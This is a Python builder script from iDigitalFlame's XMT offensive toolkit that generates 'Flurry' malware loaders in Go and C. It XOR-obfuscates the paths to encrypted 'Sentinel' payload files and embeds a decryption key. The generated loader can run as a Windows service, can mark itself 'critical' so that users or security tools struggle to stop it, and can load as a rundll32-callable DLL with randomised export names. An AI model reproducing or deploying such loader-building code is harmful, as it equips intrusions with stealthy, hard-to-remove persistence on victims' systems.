#!/usr/bin/python3
# Copyright (C) 2020 - 2022 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

from io import StringIO
from base64 import b64decode
from secrets import token_bytes
from include.util import nes, xor
from argparse import BooleanOptionalAction
from os.path import expanduser, expandvars, join
from include.builder import go_bytes, random_chars
from include.manager import Manager, is_int, is_str, is_file, str_lower, is_str_list

_LINKERS = {
    "tcp": "t",
    "pipe": "p",
    "event": "e",
    "mutex": "m",
    "mailslot": "n",
    "semaphore": "s",
}
_HELP_TEXT = """ Generates a Flurry build based on the supplied profile and behavior
 arguments.

 Arguments
   Flurry Specific Arguments
   -p                 <period(secs)>  Specify the time period (in seconds) that this
   --period                             Flurry will wait before it checks for Bolts.
                                        This value cannot be zero. It is recommended
                                        to set this value to be higher than 10 seconds.
   -W                 <guardian_name> Set the name used by the Flurry's Guardian. This
   --guardian                           can be omitted if "ignore" is true.
   -E                 <linker_type>   Set the type of Linker event used for the Flurry's
   --linker                             Guardian. This is dependent on the target OS
                                        type. See the "Linker Types" section for more
                                        info.
   -P                 <sentinels>     Specify paths to Sentinel files on the target
   --path                               filesystem. This argument may be specified
                                        multiples times for more than one path. These
                                        paths do not have to exist currently at build
                                        time.
   -n                 <key>           Specify a raw string value that can be used to
   --key                                decrypt Sentinel files.
   -N                 <key_file>      Specify a file path that contains a binary key
   --key-file                           that can be used to decrypt Sentinel files.
                                        Takes precedence over the "key" and "key_base64"
                                        arguments.
   -B                 <key_base64>    Specify a valid base64 string value to be used
   --key-b64                            to decrypt Sentinel files. Takes precedence
                                        over the "key" argument.

  Behavior Arguments
   -S                                 Enable the Bolt to be built into a Service/Daemon
   --service                            build. On Windows, it must be launched via SCM.
                                        This does not take any effect on non-Windows
                                        devices.
   -A                 <service_name>  Specify the name of the Service to be used when
   --service-name                       running as a Service. This has no effect when
                                        not running as a Service and realistically only
                                        has a purpose when running as a Service DLL on
                                        Windows.
   -R                 <checks>        Specify a string value of "Checks" to be used to
   --checks                             determine if the Flurry should run or exit. See
                                        the XMT document "Check Strings" for more
                                        information.
   -K                                 Enable or disable the ability for this Flurry to
   --critical                           mark itself as "Critical" which makes it harder
                                        to be stopped by users or solutions. This only
                                        takes effect on Windows devices when ran with
                                        administrative privileges.

  CGO Build Arguments
   -T                 <thread_name>   Supply the thread name to be used in the
   --thread                             generated C stub file.
   -F                 <function_name> Supply the function name to be used in the
   --func                               generated C stub file. This is what can
                                        be used to call the secondary function
                                        using rundll32, using "rundll32 <dll>,<func>".

 Linker Types
  The following Linker or event types are avaliable to be used for the "-E' or
  "--linker" arguments.

   tcp          Use a TCP port for Linker event communication. This type is
                  avaliable on any device and OS.
   pipe         Use Windows named pipes or pipe files in *nix for Linker event
                  communication. This type is avaliable on any device and OS.
   event        Use Windows Events for Linker event communication. This type is
                  only avaliable on Windows devices.
   mutex        Use Windows Mutexes for Linker event communication. This type is
                  only avaliable on Windows devices.
   mailslot     Use Windows Mailslots for Linker event communication. This type
                  is only avaliable on Windows devices.
   semaphore    Use Windows Semaphores for Linker event communication. This type
                  is only avaliable on Windows devices.
"""


class Flurry(object):
    __slots__ = ("_m",)

    def __init__(self):
        self._m = Manager("flurry")

    def args_help(self):
        return _HELP_TEXT

    def check(self, cfg):
        self._m.verify(cfg)
        if cfg["service"] and not nes(cfg["service_name"]):
            raise ValueError('"service_name" must be a non-empty string')

    def config_load(self, cfg):
        # Flurry Options
        self._m.add("period", ("-p", "--period"), 30, is_int(1), int)
        self._m.add(
            "linker",
            ("-E", "--linker"),
            "event",
            is_str(False, min=1, choices=_LINKERS),
            str_lower,
        )
        self._m.add("guardian", ("-W", "--guardian"), "", is_str(min=1), str)
        self._m.add(
            "paths",
            ("-P", "--path"),
            None,
            is_str_list(min=1),
            nargs="*",
            action="extend",
        )
        self._m.add("key", ("-n", "--key"), "", is_str(True), str)
        self._m.add("key_file", ("-N", "--key-file"), "", is_file(True), str)
        self._m.add(
            "key_base64", ("-B", "--key-b64"), "", is_str(True, min=4, b64=True), str
        )
        # Behavior/Type Options
        self._m.add("service_name", ("-A", "--service-name"), "", is_str(True), str)
        self._m.add("service", ("-S", "--service"), False, action=BooleanOptionalAction)
        self._m.add("checks", ("-R", "--checks"), "", is_str(True), str)
        self._m.add(
            "critical", ("-K", "--critical"), False, action=BooleanOptionalAction
        )
        # CGO Build Options
        self._m.add("func", ("-F", "--func"), "", is_str(True, ft=True), str)
        self._m.add("thread", ("-T", "--thread"), "", is_str(True, ft=True), str)
        self._m.init(cfg)

    def args_pre(self, parser):
        self._m.prep(parser)

    def args_post(self, cfg, args):
        self._m.parse(cfg, args)

    def print_options(self, cfg, root, file):
        print("- | Flurry Generator", file=file)
        print(f'- | = {"Paths:":20}', file=file)
        for i in cfg["paths"]:
            print(f"- | ==> {i}", file=file)
        if nes(cfg["key_file"]):
            print(f'- | = {"Files Key:":20}{cfg["key_file"]}', file=file)
        elif nes(cfg["key"]) or nes("key_base64"):
            print(f'- | = {"Files Key:":20}[raw data]', file=file)
        else:
            print(f'- | = {"Files Key:":20}<none>', file=file)
        print(f'- | = {"Critical:":20}{cfg["critical"]}', file=file)
        print(f'- | = {"Linker:":20}{cfg["linker"].title()}', file=file)
        print(f'- | = {"Guardian:":20}{cfg["guardian"]}', file=file)
        print(f'- | = {"Service:":20}{cfg["service"]}', file=file)
        if cfg["service"]:
            print(f'- | = {"Service Name:":20}{cfg["service_name"]}', file=file)
        print(f'- | = {"Search Period:":20}{cfg["period"]}', file=file)
        if not root.get_option("cgo"):
            return
        if nes(cfg["thread"]):
            print(f'- | = {"CGO Thread:":20}{cfg["thread"]}', file=file)
        else:
            print(f'- | = {"CGO Thread:":20}[random]', file=file)
        if nes(cfg["func"]):
            print(f'- | = {"CGO Func:":20}{cfg["func"]}', file=file)
        else:
            print(f'- | = {"CGO Func:":20}[random]', file=file)

    def run(self, cfg, base, workspace, templates):
        if nes(cfg["key_file"]):
            with open(expanduser(expandvars(cfg["key_file"])), "rb") as f:
                d = f.read()
        elif nes(cfg["key_base64"]):
            try:
                d = b64decode(cfg["key_base64"], validate=True)
            except ValueError as err:
                raise ValueError(f'bad "key_base64" base64: {err}') from err
        elif nes(cfg["key"]):
            d = cfg["key"].encode("UTF-8")
        else:
            d = bytes()
        if len(d) == 0:
            workspace["log"].warning(
                "No files key was supplied! This might not be what you want, "
                "Sentinel files will not be read if they are encrypted!"
            )
        k = token_bytes(64)
        e = _LINKERS[cfg["linker"]]
        g = xor(k, cfg["guardian"].encode("UTF-8"))
        t, p = "flurry.go", cfg["period"]
        if cfg["service"] and nes(cfg["service_name"]):
            t = "flurry_service.go"
        if not isinstance(p, int) or p <= 0:
            p = 30
        c = cfg["checks"]
        if not nes(c):
            c = "false"
        b, v = StringIO(), cfg["paths"]
        for x in range(0, len(v)):
            if x > 0:
                b.write(",\n\t")
            b.write("crypto.UnwrapString(k[:], []byte{")
            b.write(go_bytes(xor(k, v[x].encode("UTF-8")), limit=0))
            b.write("})")
        b.write(",\n")
        r = b.getvalue()
        b.close()
        del b, v
        d = templates[t].substitute(
            event=e,
            paths=r,
            checks=c,
            period=str(p),
            key=go_bytes(k),
            guard=go_bytes(g),
            files_key=go_bytes(d),
            service=cfg["service_name"],
            critical="true"
            if cfg["critical"] and not workspace["library"] and cfg["service"]
            else "false",
            # BUG(dij): Let's NOT set DLL files as critical for now. We can't
            #           control how they /exactly/ handle injection so we don't
            #           want to leave systems crashing.
        )
        del k, e, p, g, t
        p = join(base, "flurry.go")
        with open(p, "w") as f:
            f.write(d)
        del d
        workspace["tags"].append("loader")
        return p

    def run_cgo(self, export, cfg, base, workspace, templates):
        t = "flurry.c"
        if workspace["library"]:
            if cfg["service"]:
                t = "flurry_dll_service.c"
            else:
                t = "flurry_dll.c"
        n, f = cfg["thread"], cfg["func"]
        if not nes(n):
            n = random_chars(12)
        if not nes(f):
            f = random_chars(12)
        d = templates[t].substitute(
            thread=n, funcname=f, export=export, secondary=workspace["secondary"]
        )
        del t, n, f
        p = join(base, "entry.c")
        with open(p, "w") as f:
            f.write(d)
        del d
        return (p, "flurry")
